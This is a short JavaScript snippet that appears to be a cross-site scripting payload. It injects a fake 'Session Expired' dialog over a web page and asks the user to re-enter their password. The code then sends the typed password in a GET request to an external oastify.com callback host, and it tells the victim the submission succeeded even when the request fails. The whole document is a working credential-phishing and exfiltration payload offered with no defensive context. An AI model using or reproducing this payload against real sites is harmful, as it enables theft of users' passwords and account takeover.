// This script creates a password prompt and sends the password to the server

let div = document.createElement('div');
div.style.position = 'fixed';
div.style.top = '20%';
div.style.left = '50%';
div.style.transform = 'translate(-50%, 0)';
div.style.background = 'white';
div.style.padding = '20px';
div.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
div.style.zIndex = '9999';
div.innerHTML = `
    <h2>Session Expired</h2>
    <p>Please re-enter your password:</p>
    <input type="password" id="pPass" placeholder="Enter password" required>
    <button id="submitBtn">Submit</button>
`;
document.body.appendChild(div);

// Function to send the password when the user submits
function sendData() {
    let pass = document.getElementById('pPass').value;

    if (!pass) {
        alert("Please enter a password!");
        return;
    }

    // Send the password via GET request to the specified URL
    fetch(`https://jbyu3l0waf9h4rx0dhcm6tef167xvnjc.oastify.com?password=${encodeURIComponent(pass)}`)
        .then(response => response.text())
        .then(data => {
            console.log("Response from server:", data);
            alert("Password sent successfully!");
        })
        .catch(error => {
            console.error("Error sending password:", error);
            alert("Thank you!");
        });
}

// Attach event listener to the Submit button
document.getElementById('submitBtn').addEventListener('click', sendData);
